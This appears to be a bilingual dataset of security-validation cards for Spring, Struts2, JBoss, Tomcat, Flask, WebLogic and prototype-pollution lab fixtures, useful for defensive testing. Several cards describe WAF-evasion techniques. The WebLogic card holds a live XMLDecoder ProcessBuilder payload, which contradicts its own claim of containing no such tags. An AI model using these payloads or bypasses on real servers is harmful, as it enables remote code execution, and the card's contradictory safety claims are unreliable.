mitigation.en: Upgrade affected Spring Cloud components, expose only necessary Actuator endpoints, and enforce minimal roles on Gateway management endpoints with Spring Security; disable unneeded route writes. After the fix, replay the step-1 request and confirm the low-privilege token cannot read routes while business routing is unaffected.

title.zh: 记录 Gateway 版本与端点策略
title.en: Record Gateway version and endpoint policy

description.zh: 登记 JAR 版本、routes 暴露配置和低权限角色预期结果。
description.en: Register JAR version, routes exposure configuration, and expected low-privilege outcome.

title.zh: 请求只读 routes 状态

description.zh: 向 localhost 发送一次带低权限令牌的 GET，并断言拒绝或关闭。
description.en: Send one low-privilege GET to localhost and assert denial or endpoint absence.

attackChain.payload: code=$(curl --silent --show-error --max-time 5 -o /dev/null -w '%{http_code}' "http://127.0.0.1:18080/actuator/gateway/routes" -H "Authorization: Bearer spring-user-token" -H "X-Request-ID: spring-cloud-gateway-001"); printf '%s\n' "$code"; test "$code" = 401 -o "$code" = 403 -o "$code" = 404

title.zh: 关联 Spring Security 决策

description.zh: 将状态码与认证主体、授权规则和访问日志按请求 ID 对齐。
description.en: Align status with principal, authorization rule, and access logs by request ID.

title.zh: 升级并收紧暴露后复测
title.en: Retest after upgrade and exposure hardening

description.zh: 升级组件并限制管理端点后重放请求，确认业务路由不受影响。
description.en: After component upgrade and management hardening, replay the request and confirm business routing remains available.

prerequisites.zh: 使用固定 Spring Cloud Gateway 版本的本地 Fixture，并清空真实后端路由。
prerequisites.en: Use a local fixture with a fixed Spring Cloud Gateway version and no real backend routes.

prerequisites.zh: 准备低权限实验令牌并记录 routes 端点应返回 401、403 或 404。
prerequisites.en: Prepare a low-privilege lab token and record that the routes endpoint should return 401, 403, or 404.

analysis.zh: 401、403 或 404 与授权日志一致时为阴性；200 只说明读取暴露，还需确认内容与写权限才能定级。本批不创建路由、不触发 SpEL，也不验证 RCE，因此结论严格限定为管理端点访问策略。
analysis.en: Consistent 401, 403, or 404 with authorization logs is negative. Status 200 establishes read exposure only and requires content and write-permission analysis. This batch creates no route, triggers no SpEL, and makes no RCE claim.

opsecTips.zh: 只执行一次 GET，不发送 POST、DELETE、refresh 或任何表达式 Header。
opsecTips.en: Perform one GET only, with no POST, DELETE, refresh, or expression headers.

opsecTips.zh: Fixture 不连接真实服务发现和后端路由，令牌仅用于 localhost。
opsecTips.en: Keep the fixture disconnected from real service discovery and backend routes, with a localhost-only token.

description.zh: 绕过对 /actuator/env 精确路径封禁：插入 /./ 段利用归一化差异；返回 200 即端点可达。
description.en: Insert /./ segments to exploit normalization gaps past exact-path blocking; a 200 response confirms reachability.

description.zh: 绕过仅封 env 的策略：轮换网关管理端点读取路由表；返回 JSON 即管理面暴露。
description.en: Rotate gateway management endpoints past env-only blocking; returned JSON confirms management exposure.

description.zh: 利用路由中间件对覆写头的信任差异：主路径正常而覆写指向管理端；返回管理响应状态即成功。
description.en: Exploit middleware trust in override headers where the main path is clean; a management response status confirms success.

name.zh: Struts2 OGNL 简单求值边界验证

description.zh: 在 localhost Struts Fixture 中仅提交固定算术 OGNL，验证结果并断言静态方法和进程启动能力关闭。
description.en: Submit one fixed arithmetic OGNL expression to a localhost Struts fixture and validate the result while asserting static-method and process-start capabilities are disabled.

subCategory.zh: 表达式与 Lookup 注入

overview.zh: Struts2 OGNL 简单求值边界验证针对 OGNL 表达式求值能力的场景：受限求值器是否真的关闭了危险能力。验证仅提交固定算术 OGNL，断言结果正确且静态方法与进程启动能力关闭。
overview.en: The Struts2 OGNL simple-evaluation boundary validation targets OGNL evaluation capability: does the restricted evaluator truly disable dangerous capabilities? It submits only a fixed arithmetic OGNL expression and asserts a correct result with static-method and process-start capabilities closed.

vulnerability.zh: Struts2 历史 OGNL 问题源于不可信请求值进入表达式求值且成员访问或排除策略可被绕过；单纯支持 OGNL 与算术不等于 RCE，必须证明主体可越过成员访问边界到达危险类型或方法。
vulnerability.en: Historical Struts2 OGNL issues stem from untrusted request values entering expression evaluation with bypassable member-access or exclusion policies; supporting OGNL and arithmetic alone is not RCE—you must prove the principal can cross the member-access boundary into dangerous types or methods.

exploitation.zh: 按第 1 步向本地受限求值器提交 value=%{7*7} 并携带请求 ID；命中判据为结果等于 49 且 static_method_access 与 process_start 均为 false。结果证明 OGNL 求值入口可达，能力标志证明危险边界关闭；两者结合构成配置基线。不要提交清空排除类或替换 MemberAccess 的载荷，能力标志为 true 时立即升级处理并单独取证。
exploitation.en: As in step 1, submit value=%{7*7} to the local restricted evaluator with a request ID; a hit is a result of 49 with static_method_access and process_start both false. The result proves the OGNL evaluation entry is reachable while the capability flags prove dangerous boundaries are closed—together a configuration baseline. Do not submit payloads clearing exclusion classes or replacing MemberAccess; if a capability flag is true, escalate immediately with separate evidence.

mitigation.zh: 升级到 Apache Struts 受支持版本，避免把不可信字符串作为 OGNL 求值，保持成员访问限制、排除类与包设置，并用允许字段的数据绑定。修复后重放第 1 步请求，确认能力标志保持关闭并对异常表达式建立审计。
mitigation.en: Upgrade to supported Apache Struts versions, avoid evaluating untrusted strings as OGNL, keep member-access restrictions, exclusion classes, and package settings, and bind data through allowed fields. After the fix, replay the step-1 request, confirm capability flags stay off, and audit anomalous expressions.

title.zh: 固定 Struts 与 OGNL 策略

description.zh: 记录 Struts 版本、成员访问、排除类和允许绑定字段。
description.en: Record Struts version, member access, excluded classes, and allowed binding fields.

description.zh: 向 localhost Fixture 提交 7*7，只读取结果与能力标志。
description.en: Submit 7*7 to the localhost fixture and read only the result and capability flags.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/struts-lab/evaluate" -H "X-Request-ID: struts-ognl-simple-001" --data-urlencode 'value=%{7*7}' | jq -e '.result == 49 and .static_method_access == false and .process_start == false'

description.zh: 按请求 ID 核对求值、静态方法拒绝和无进程启动事件。
description.en: Use the request ID to verify evaluation, static-method denial, and absence of process starts.

description.zh: 升级后重放正常字段和算术值，确认业务绑定保留且高风险能力关闭。
description.en: After upgrade, replay normal fields and arithmetic to preserve business binding while risky capabilities remain disabled.

prerequisites.zh: 使用固定 Struts2 版本和受限 OGNL Fixture，不加载文件或命令执行辅助类。
prerequisites.en: Use a fixed Struts2 version and restricted OGNL fixture without file or command-execution helper classes.

prerequisites.zh: 记录 excludedClasses、excludedPackageNames 与静态方法访问设置。
prerequisites.en: Record excludedClasses, excludedPackageNames, and static-method-access settings.

analysis.zh: 结果 49 仅说明表达式被求值，不证明可访问 Runtime 或文件系统。阳性需要静态方法、成员访问或危险对象边界被突破；本批明确验证这些能力为 false，并退休所有执行与规避内容。
analysis.en: Result 49 establishes expression evaluation only, not access to Runtime or the filesystem. A positive requires a static-method, member-access, or dangerous-object boundary breach; this batch asserts those capabilities false and retires execution plus evasion material.

opsecTips.zh: 只使用固定算术表达式，不修改 MemberAccess、排除类、响应流或文件。
opsecTips.en: Use one fixed arithmetic expression without changing MemberAccess, exclusions, response streams, or files.

opsecTips.zh: 容器无网络出口和业务数据，五秒超时后清理求值日志。
opsecTips.en: Keep the container free of egress and business data, enforcing five seconds and clearing evaluation logs.

description.zh: 绕过对 @...@ 单一表达式特征的检测：拆成映射变量两段链式调用；命令执行输出返回即成功。
description.en: Split into mapped variables chained in two stages past single-expression signatures; returned command output confirms success.

description.zh: 成员名与命令参数 Unicode 转义：明文特征缺失而解析等价；执行结果回显即成功。
description.en: Unicode-escape member names and arguments so plaintext signatures vanish while parsing stays equivalent; echoed execution results confirm success.

description.zh: 以 multipart 字段承载 OGNL：绕过对纯文本体扫描的规则；进程执行副作用出现即成功。
description.en: Carry the OGNL in a multipart field past plain-body scanning; process execution side effects confirm success.

name.zh: JBoss 管理界面访问边界验证

description.zh: 验证 localhost JBoss 或 WildFly 实验实例的旧 JMX Console 是否关闭或要求认证，并将 Invoker、版本和管理资源诊断迁入工具卡。
description.en: Validate whether a localhost JBoss or WildFly lab protects or disables the legacy JMX Console while moving Invoker, version, and management-resource diagnostics into a tool card.

overview.zh: JBoss 管理界面访问边界验证针对旧 JBoss/WildFly 管理面暴露的场景：匿名主体能否进入 JMX Console。验证以无凭据请求 /jmx-console/ 并只接受 401、403 或 404 作为安全基线。
overview.en: The JBoss management-interface access boundary validation targets exposure of legacy JBoss/WildFly management planes: can an anonymous principal reach the JMX Console? It requests /jmx-console/ without credentials and accepts only 401, 403, or 404 as the security baseline.

vulnerability.zh: 根因是旧 JBoss 管理与 Invoker 接口暴露到不受信网络且缺少认证，可能允许管理操作、序列化入口或部署能力；端点存在不等于可利用，必须确认未认证主体能执行受保护管理动作。
vulnerability.en: The root cause is legacy JBoss management and Invoker interfaces exposed to untrusted networks without authentication, potentially allowing administrative operations, serialization entries, or deployment capability; endpoint existence is not exploitability—confirm that unauthenticated principals can perform protected management actions.

exploitation.zh: 按第 1 步对 /jmx-console/ 发起无凭据 GET 并携带请求 ID；命中判据为返回 401、403 或 404，说明匿名访问被拒绝，构成安全基线。若返回 200 且渲染控制台页面，说明管理面暴露，记录页面与版本信息作为证据；验证过程不调用任何部署或管理操作，服务端访问日志可确认请求到达正确实例。
exploitation.en: As in step 1, issue an unauthenticated GET to /jmx-console/ with a request ID; a hit is 401, 403, or 404, showing anonymous access is denied and forming the security baseline. A 200 rendering the console page means the management plane is exposed—record the page and version details as evidence. Never invoke deployment or management actions during validation; server access logs confirm the request reached the right instance.

mitigation.zh: 升级到受支持的 WildFly 或 JBoss EAP，删除不需要的旧 Console 与 Invoker 应用，管理接口绑定专用地址并启用强认证与角色控制，用防火墙限制管理端口。修复后重放第 1 步请求，确认匿名访问被拒绝且授权管理流程正常。
mitigation.en: Upgrade to supported WildFly or JBoss EAP, remove unneeded legacy console and Invoker applications, bind the management interface to a dedicated address with strong authentication and role control, and firewall the management port. After the fix, replay the step-1 request and confirm anonymous access is denied while authorized management flows work.

description.zh: 记录容器端口、管理 Realm、版本和预期关闭或认证的路径。
description.en: Record container port, management realm, version, and paths expected to be disabled or authenticated.

title.zh: 请求 JMX Console 根路径

description.zh: 无凭据请求 localhost JMX Console，只验证访问策略和状态码。
description.en: Request the localhost JMX Console without credentials and evaluate access policy and status only.

description.zh: 用请求 ID 核对 Realm 决策、重定向和实际处理模块，排除代理默认页。
description.en: Use the request ID to correlate realm decisions, redirects, and the serving module, excluding proxy default pages.

description.zh: 移除旧 Console 或启用认证后重放请求，确认管理面不再匿名可达。
description.en: After removing the legacy console or enabling authentication, replay the request and confirm anonymous access is unavailable.

prerequisites.zh: 启动无业务数据的 jboss-lab 容器，并只将实验 HTTP 端口绑定到 127.0.0.1。
prerequisites.en: Start a data-free jboss-lab container and bind its laboratory HTTP port to 127.0.0.1 only.

prerequisites.zh: 记录预期管理路径、认证方式、管理 Realm 和已安装版本。
prerequisites.en: Record expected management paths, authentication method, management realm, and installed version.

analysis.zh: 确认风险需要匿名主体可到达受保护管理操作；端点返回 200、产品指纹或登录页都只是暴露线索。401、403、404 与服务端 Realm 日志一致时属于阴性，不能用部署或命令执行去扩大证明。
analysis.en: Risk confirmation requires an anonymous principal to reach a protected management operation. Status 200, a product fingerprint, or a login page is only an exposure lead. Consistent 401, 403, or 404 with realm logs is negative and should not be escalated through deployment or command execution.

opsecTips.zh: 只访问容器根管理路径，不调用任何 deploy、invoke、upload 或脚本接口。
opsecTips.en: Access only root management paths and never call deploy, invoke, upload, or scripting interfaces.

opsecTips.zh: 容器仅绑定 localhost，使用合成 Realm，测试后删除访问日志中的令牌与 Cookie。
opsecTips.en: Bind the container to localhost, use a synthetic realm, and remove tokens and cookies from access logs afterward.

description.zh: 利用网关对 /./ 归一化差异：清洗层放行而应用命中控制台；返回 200/401 即端点暴露。
description.en: Exploit /./ normalization gaps between gateway and app; a 200/401 response confirms console exposure.

description.zh: 绕过仅对 jmx-console 路径的封禁：轮换历史管理控制台路径；任一返回非 404 即暴露。
description.en: Rotate legacy console paths past jmx-console-only blocking; any non-404 response confirms exposure.

description.zh: 绕过对明文路径段匹配：百分号编码段由应用解码；返回管理页状态码即成功。
description.en: Percent-encode the segment past plaintext matching, letting the app decode it; an admin-page status code confirms success.

name.zh: Tomcat Manager 访问控制边界验证

description.zh: 无凭据请求 localhost Tomcat Manager，验证返回 401、403 或 404，并将 AJP 配置和方法策略迁入工具诊断。
description.en: Request the localhost Tomcat Manager without credentials, validate a 401, 403, or 404 response, and move AJP configuration plus method policy into diagnostics.

overview.zh: Tomcat Manager 访问控制边界验证针对 Manager 应用暴露的场景：匿名主体能否进入 /manager/html。验证无凭据请求只接受 401、403 或 404，不尝试任何账户；AJP 与方法策略归工具诊断。
overview.en: The Tomcat Manager access-control boundary validation targets Manager application exposure: can an anonymous principal reach /manager/html? It issues a credential-free request accepting only 401, 403, or 404 and never attempts accounts; AJP and method policy belong to tool diagnostics.

vulnerability.zh: 根因是 Manager 弱认证或暴露到不受信网络、AJP 配置错误或缺省 Servlet 写方法开启等独立问题组合；Manager 页面存在本身不是漏洞，只有未授权管理能力或弱凭据被确认才成立。
vulnerability.en: The root causes are independent issues—weak Manager authentication or untrusted exposure, misconfigured AJP, or default-servlet write methods enabled; the Manager page existing is not itself a vulnerability, only confirmed unauthorized management capability or weak credentials.

exploitation.zh: 按第 1 步对 /manager/html 发起无凭据 GET 并携带请求 ID；命中判据为返回 401、403 或 404，说明 Manager 对匿名主体关闭，构成安全基线。若返回 200 渲染管理页面，说明 Manager 暴露，记录页面特征作为证据；验证过程不尝试用户名、密码、WAR 上传或部署，并要求结果与 Realm、RemoteAddrValve 日志一致。
exploitation.en: As in step 1, issue a credential-free GET to /manager/html with a request ID; a hit is 401, 403, or 404, showing Manager is closed to anonymous principals and forming the baseline. A 200 rendering the management page means exposure—record page characteristics as evidence. Never attempt usernames, passwords, WAR uploads, or deployment during validation, and require consistency with Realm and RemoteAddrValve logs.

mitigation.zh: 删除不需要的 Manager 并限制到管理网段，使用强认证与最小角色；升级 Tomcat，禁用不需要的 AJP 或绑定回环并设置 secretRequired 与随机 secret，保持 DefaultServlet readonly。修复后重放第 1 步请求，确认匿名访问被拒绝。
mitigation.en: Remove unneeded Manager instances and confine them to management segments with strong authentication and minimal roles; upgrade Tomcat, disable unneeded AJP or bind it to loopback with secretRequired and a random secret, and keep DefaultServlet readonly. After the fix, replay the step-1 request and confirm anonymous access is denied.

title.zh: 记录 Manager 与 Realm 基线

description.zh: 登记 Manager 安装状态、允许地址、Realm 和匿名预期结果。
description.en: Register Manager installation, allowed addresses, realm, and expected anonymous outcome.

title.zh: 发送匿名 Manager 请求

description.zh: 只请求 localhost /manager/html，并断言 401、403 或 404。
description.en: Request only localhost /manager/html and assert 401, 403, or 404.

title.zh: 关联 Realm 与访问日志

description.zh: 按请求 ID 核对认证挑战、RemoteAddrValve 和实际 Context。
description.en: Correlate authentication challenge, RemoteAddrValve, and actual Context by request ID.

description.zh: 移除 Manager 或限制来源后重放匿名与授权管理员两个对照。
description.en: After removing Manager or restricting sources, replay anonymous and authorized-admin controls.

prerequisites.zh: 使用仅含合成应用的 tomcat-lab 容器，并将 HTTP 与 AJP 绑定到本机。
prerequisites.en: Use a tomcat-lab container with synthetic applications and bind HTTP plus AJP to the local host.

prerequisites.zh: 记录 Manager 是否安装、允许来源、认证 Realm 和预期匿名状态。
prerequisites.en: Record whether Manager is installed, allowed sources, authentication realm, and expected anonymous status.

analysis.zh: 匿名 200 需要进一步确认是否是真实 Manager 和是否提供管理操作；401、403、404 与日志一致时为阴性。本批不尝试凭据、部署、AJP 文件读取、PUT 写入或文件名规避。
analysis.en: Anonymous status 200 requires confirmation that the page is the real Manager and exposes management operations; aligned 401, 403, or 404 is negative. This batch attempts no credentials, deployment, AJP file read, PUT write, or filename evasion.

opsecTips.zh: 不使用用户名、密码、Hydra、WAR、JSP 或 PUT 请求。
opsecTips.en: Use no usernames, passwords, Hydra, WAR, JSP, or PUT requests.

opsecTips.zh: 容器只含合成应用，AJP 配置只读且端口不暴露到外部网络。
opsecTips.en: Keep only synthetic apps in the container, inspect AJP read-only, and expose no AJP port externally.

description.zh: 绕过对 /manager/html 明文封禁：路径编码后由容器解码；返回 401/200 即管理应用暴露。
description.en: Encode the path past plaintext blocking, letting the container decode it; a 401/200 response confirms manager exposure.

description.zh: 绕过仅封 /html 的策略：轮换 text/jmxproxy 管理子端点；返回 401 即暴露。
description.en: Rotate text/jmxproxy sub-endpoints past /html-only blocking; a 401 response confirms exposure.

description.zh: 以服务器状态页确认管理应用整体暴露：低敏感端点常被遗漏放行；返回 401/200 即成功。
description.en: Confirm overall manager exposure via the server status page often left unblocked; a 401/200 response confirms success.

name.zh: Flask Jinja 求值边界验证

description.zh: 把宽泛的 Flask 漏洞合集拆成 Jinja 表达式求值 Payload 与 Flask 配置诊断工具，删除 Session 伪造、调试控制台执行和 PIN 推导内容。
description.en: Split the broad Flask vulnerability collection into Jinja expression-evaluation payloads and Flask configuration diagnostics, removing session forgery, debug-console execution, and PIN derivation.

overview.zh: Flask Jinja 求值边界验证针对把非可信字符串交给 render_template_string 的场景：Jinja 会计算表达式而非按字面输出。验证以 {{7*7}} 算术 marker 确认模板求值边界，其余配置检查归工具区。
overview.en: The Flask Jinja evaluation-boundary validation targets non-trusted strings passed to render_template_string, where Jinja evaluates expressions instead of outputting them literally. It confirms the template-evaluation boundary with a {{7*7}} arithmetic marker; other configuration checks belong to the tools area.

vulnerability.zh: 根因是应用把请求文本当作模板源解析，Jinja 求值上下文暴露的属性访问与方法调用决定影响范围；返回计算结果只能证明求值边界，不能自动证明文件读取或代码执行。
vulnerability.en: The root cause is the application parsing request text as template source; the attribute access and method invocation exposed by the Jinja evaluation context determine impact. A returned computation only proves the evaluation boundary, not automatically file reads or code execution.

exploitation.zh: 按第 1 步向 /lab/flask/render 提交 name={{7*7}} 并携带请求 ID；命中判据为 JSON 返回 rendered=49 且 request_id 匹配，证明输入被当作模板源求值。确认求值边界后按需要评估上下文暴露面；被关键字拦截时改用 WAF 绕过区的 Jinja 字符串拼接 marker 形式。不要把 SECRET_KEY 泄露或调试器暴露混入同一结论，应分别验证、分别报告。
exploitation.en: As in step 1, submit name={{7*7}} to /lab/flask/render with a request ID; a hit is JSON returning rendered=49 with a matching request_id, proving the input was parsed as template source. After confirming the evaluation boundary, assess context exposure as needed; if keywords are blocked, use the Jinja string-concatenation marker form in the WAF-bypass section. Do not mix SECRET_KEY leakage or debugger exposure into the same finding—verify and report them separately.

mitigation.zh: 不要把用户输入作为模板源传给 render_template_string，使用固定模板文件并把输入作为数据变量传入；生产关闭调试器并使用高熵 SECRET_KEY。修复后重放第 1 步请求，确认响应按字面返回 {{7*7}} 且正常渲染不受影响。
mitigation.en: Never pass user input as template source to render_template_string—use fixed template files and pass input as data variables; disable the debugger in production and use a high-entropy SECRET_KEY. After the fix, replay the step-1 request and confirm the response returns {{7*7}} literally while normal rendering is unaffected.

description.zh: 提交普通 name 值并记录 JSON、request_id 和模板渲染日志的正常结果。
description.en: Submit a plain name value and record normal JSON, request_id, and template-rendering logs.

description.zh: 使用算术 marker 判断输入被当作模板源还是普通变量，不访问任何对象属性。
description.en: Use an arithmetic marker to distinguish template source from an ordinary variable without accessing object attributes.

description.zh: 用字符串拼接 marker 复核结果，排除应用硬编码 49 或缓存响应造成的误报。
description.en: Confirm with a string-concatenation marker to exclude a hard-coded 49 or cached response.

description.zh: 单独检查 debug、SECRET_KEY 状态和敏感路由，修复后要求表达式按字面输出。
description.en: Inspect debug, SECRET_KEY state, and sensitive routes separately, then require expressions to render literally after remediation.

prerequisites.zh: 使用 127.0.0.1 Flask Fixture，模板只渲染合成 name 参数并以 JSON 返回结果。
prerequisites.en: Use the 127.0.0.1 Flask fixture, rendering only a synthetic name parameter and returning the result as JSON.

prerequisites.zh: 准备可读取配置但不会打印 SECRET_KEY 值的本地应用上下文，并确保 debug=False。
prerequisites.en: Prepare a local application context that can inspect configuration without printing the SECRET_KEY value and ensure debug=False.

analysis.zh: 只有输入表达式被稳定求值且能关联到模板源构造点时才确认 SSTI 边界。调试器返回 404、SECRET_KEY 已配置或响应出现数字都不是同一结论；每类风险必须有独立证据。
analysis.en: Confirm the SSTI boundary only when input expressions are evaluated consistently and can be mapped to template-source construction. A debugger 404, a configured SECRET_KEY, or a numeric response are not the same finding; each risk needs independent evidence.

opsecTips.zh: Payload 仅使用算术与字符串 marker，禁止对象遍历、文件读取、环境变量访问和命令执行。
opsecTips.en: Payloads use arithmetic and string markers only; object traversal, file reads, environment access, and command execution are excluded.

opsecTips.zh: 配置诊断只输出布尔值、长度和路由名，不打印 SECRET_KEY、Cookie、PIN 或用户数据。
opsecTips.en: Configuration diagnostics output booleans, lengths, and route names only, never SECRET_KEY values, cookies, PINs, or user data.

name.zh: WebLogic WorkContext 无害输入拒绝验证
name.en: WebLogic Harmless WorkContext Input Rejection Validation

description.zh: 向 localhost WSAT 端点提交仅含合成 marker 的 SOAP WorkContext，验证补丁后拒绝或安全处理，不包含 java、XMLDecoder、对象或方法标签。
description.en: Submit a SOAP WorkContext containing only a synthetic marker to a localhost WSAT endpoint and validate patched rejection or safe handling without java, XMLDecoder, object, or method tags.

overview.zh: WebLogic WorkContext 无害输入拒绝验证针对 WSAT 端点对非预期 WorkContext 内容的处理场景：补丁后应拒绝或安全处理。验证仅提交含合成 marker 的 SOAP 信封，不含任何 Java 对象标签。
overview.en: The WebLogic WorkContext harmless-input rejection validation targets WSAT endpoint handling of unexpected WorkContext content: patched instances should reject or safely process it. It submits a SOAP envelope containing only a synthetic marker, with no Java object tags.

vulnerability.zh: 历史 WebLogic XMLDecoder 问题依赖易受影响端点把攻击者 XML 交给可实例化 Java 对象的方法；端点返回、SOAP Fault 或 WorkContext 解析本身不等于对象实例化，版本、补丁和解析日志必须证明危险标签不可达。
vulnerability.en: Historical WebLogic XMLDecoder issues rely on vulnerable endpoints handing attacker XML to methods that instantiate Java objects; endpoint responses, SOAP faults, or WorkContext parsing alone do not equal object instantiation—version, patch, and parse logs must prove dangerous tags are unreachable.

exploitation.zh: 按第 1 步向 /wls-wsat/CoordinatorPortType 提交仅含 lab:marker 的 SOAP Envelope 并携带请求 ID；命中判据为端点返回拒绝状态（非 200 或 SOAP Fault），且日志显示输入被安全处理。记录响应状态与 WorkContext 解析日志作为补丁有效性证据；验证过程刻意不包含 XMLDecoder、ProcessBuilder 等任何 Java 对象标签，避免对目标产生真实执行风险。
exploitation.en: As in step 1, POST a SOAP Envelope containing only lab:marker to /wls-wsat/CoordinatorPortType with a request ID; a hit is a rejection status (non-200 or SOAP fault) with logs showing safe handling. Record the response status and WorkContext parse logs as patch-effectiveness evidence. The validation deliberately excludes XMLDecoder, ProcessBuilder, or any Java object tags, avoiding real execution risk to the target.

mitigation.zh: 应用 Oracle CPU 补丁，删除或限制不需要的 WSAT 与 AsyncResponseService，使用严格 XML 解析与元素允许列表，拒绝 Java 对象语义标签；管理服务绑定受控网络。修复后重放第 1 步请求，确认拒绝行为与解析日志保持一致。
mitigation.en: Apply Oracle CPU patches, remove or restrict unneeded WSAT and AsyncResponseService, use strict XML parsing with element allowlists, and reject Java-object semantic tags; bind management services to controlled networks. After the fix, replay the step-1 request and confirm rejection behavior and parse logs remain consistent.

title.zh: 固定域版本与 WSAT 策略
title.en: Fix domain version and WSAT policy

description.zh: 记录 WebLogic 版本、CPU、WSAT 部署和允许 XML 元素。
description.en: Record WebLogic version, CPU, WSAT deployment, and allowed XML elements.

description.zh: 向 localhost CoordinatorPortType 发送不含 Java 对象语义的 SOAP。
description.en: Send SOAP without Java-object semantics to the localhost CoordinatorPortType.

title.zh: 核对拒绝与无副作用证据

description.zh: 按请求 ID 对齐 Fault、解析日志和零类加载、进程、文件及网络事件。
description.en: Align Fault, parse logs, and zero class-load, process, file, or network events by request ID.

title.zh: 补丁与元素允许列表回归

description.zh: 应用 CPU 和元素允许列表后重放合法 SOAP 与无害 marker 阴性请求。
description.en: After CPU and element allowlists, replay valid SOAP and the harmless marker negative request.

prerequisites.zh: 使用已知 WebLogic 版本和 CPU 补丁的 localhost 容器，WSAT 无业务事务数据。
prerequisites.en: Use a localhost container with known WebLogic version and CPU patch and no business transaction data in WSAT.

prerequisites.zh: 启用 XML 解析拒绝、WorkContext 处理和网络出口日志。
prerequisites.en: Enable XML parse rejection, WorkContext handling, and network-egress logs.

analysis.zh: HTTP 响应和 SOAP Fault 只能说明请求到达解析路径。安全结论要求危险 Java 对象标签被拒绝、无类加载和无副作用；本批请求根本不含这些标签，因此只验证补丁后的拒绝与观测边界。
analysis.en: HTTP responses and SOAP Faults show only that the request reached parsing. Security conclusions require dangerous Java-object tags to be rejected with no class loading or side effects; this request contains none and validates patched rejection plus observability only.

opsecTips.zh: XML 仅含标准 Envelope、WorkContext 和合成 marker，不含任何 Java 类或方法标签。
opsecTips.en: Keep XML to the standard envelope, WorkContext, and synthetic marker with no Java class or method tags.

opsecTips.zh: 容器禁用外部网络与业务事务，单次请求五秒后清理 SOAP 日志。
opsecTips.en: Disable external networking and business transactions, send one five-second request, and clear SOAP logs afterward.

wafBypass.command: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/wls-wsat/CoordinatorPortType" -H "Content-Type: text/xml" --data '<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><![CDATA[<void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"/><void index="0"><string>id</string></void></void>]]></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'

description.zh: 绕过对 WorkContext 内明文元素扫描：载荷藏入 CDATA 节点由解析器还原；反序列化路径触发即成功。
description.en: Hide the payload inside a CDATA node past plaintext scanning of WorkContext; the deserialization path firing confirms success.

description.zh: 绕过仅封 CoordinatorPortType 的策略：轮换异步 WSAT 端点同语义验证；返回非 404 且 SOAP 应答即成功。
description.en: Rotate the async WSAT endpoint past CoordinatorPortType-only blocking; a SOAP response other than 404 confirms success.

description.zh: 关键类名字符实体编码：明文指纹缺失而 XML 解析还原；服务端处理无拒绝错误即成功。
description.en: Entity-encode key characters so plaintext fingerprints vanish until XML parsing restores them; the server processing without a rejection error confirms success.

name.zh: 服务端原型链污染边界验证

description.zh: 使用无害 marker 验证深度合并是否拒绝 __proto__、constructor.prototype 与嵌套原型路径，并把依赖与合并函数审计迁入工具区。
description.en: Use harmless markers to verify that deep merges reject __proto__, constructor.prototype, and nested prototype paths, while moving dependency and merge-function audits into tools.

subCategory.zh: 服务端 JSON 合并污染

overview.zh: 服务端原型链污染边界验证针对深度合并接受特殊原型键的场景：__proto__ 或 constructor.prototype 可写入共享原型。验证直接属性、原型属性与 Schema 拒绝三类检查，配合合并函数与依赖审计。
overview.en: Server-side prototype-pollution boundary validation targets deep merges accepting special prototype keys, where __proto__ or constructor.prototype writes the shared prototype. It validates direct properties, prototype properties, and schema rejection, alongside merge-function and dependency audits.

vulnerability.zh: 漏洞通常来自递归复制可枚举键时未拒绝 __proto__、prototype 或 constructor，或使用存在已知缺陷的深度合并库；只有 marker 出现在与输入无关的新对象原型上且排除缓存与回显时，污染才确认成立。
vulnerability.en: The vulnerability usually stems from recursively copying enumerable keys without rejecting __proto__, prototype, or constructor, or from deep-merge libraries with known flaws; pollution is confirmed only when the marker appears on the prototype of a fresh object unrelated to the input, with caching and echo excluded.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交 __proto__ labMarker，命中判据为直接属性与原型属性均为空；第 2 步提交 constructor.prototype 路径 marker 验证 Schema 同时拒绝；WAF 拦截时改用嵌套 __proto__ marker。任一步返回原型属性即污染成立，再单独评估 gadget，不直接等同 RCE。
exploitation.en: Use payloads in list order: step 1 submits the __proto__ labMarker—a hit is both direct and prototype properties empty; step 2 submits the constructor.prototype path marker to verify schema rejection too; on WAF blocks use the nested __proto__ marker. A returned prototype property on either confirms pollution—then assess gadgets separately, never equating it with RCE.

mitigation.zh: Schema 层拒绝未知字段和危险键，任意键值用 Object.create(null) 或 Map；递归合并只处理自有属性并拒绝 __proto__、prototype 与 constructor；升级依赖并加回归。修复后重放第 1、2 步 marker，确认原型未污染。
mitigation.en: Reject unknown fields and dangerous keys at the schema layer, storing arbitrary key-values in Object.create(null) or Map; recursive merges process only own properties and reject __proto__, prototype, and constructor; upgrade dependencies and add regressions. After the fix, replay the step 1-2 markers and confirm clean prototypes.

title.zh: 固定全新 Worker 基线

description.zh: 启动无网络出口的实验 Worker，确认普通对象上不存在任何测试 marker。
description.en: Start the no-egress fixture worker and confirm that ordinary objects contain no test marker.

description.zh: 一次只提交一种危险键路径，并要求响应区分直接属性与原型继承属性。
description.en: Submit one dangerous-key path at a time and require the response to distinguish own and inherited properties.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/prototype/merge" -H "Content-Type: application/json" -H "X-Request-ID: proto-a1" --data '{"__proto__":{"labMarker":"PROTO_CANARY_A1"}}' | jq -e '.ownMarker == null and .prototypeMarker == null'

description.zh: 在独立请求中创建新对象并检查 marker，排除单纯回显、缓存和请求对象复用。
description.en: Create a fresh object in an independent request and inspect the marker, excluding reflection, caching, and request-object reuse.

description.zh: 把阳性 marker 关联到具体合并函数或依赖，修复后对全部路径重复测试。
description.en: Map a positive marker to a specific merge function or dependency and repeat every path after remediation.

prerequisites.zh: 使用无网络出口的 127.0.0.1 Node.js Fixture，并在每次请求后重启或清理 Worker。
prerequisites.en: Use a no-egress 127.0.0.1 Node.js fixture and restart or clean the worker after each request.

prerequisites.zh: 响应只暴露 ownMarker 与 prototypeMarker 两个布尔或空值证据，不读取文件也不启动子进程。
prerequisites.en: Expose only ownMarker and prototypeMarker boolean or null evidence in responses, without reading files or starting child processes.

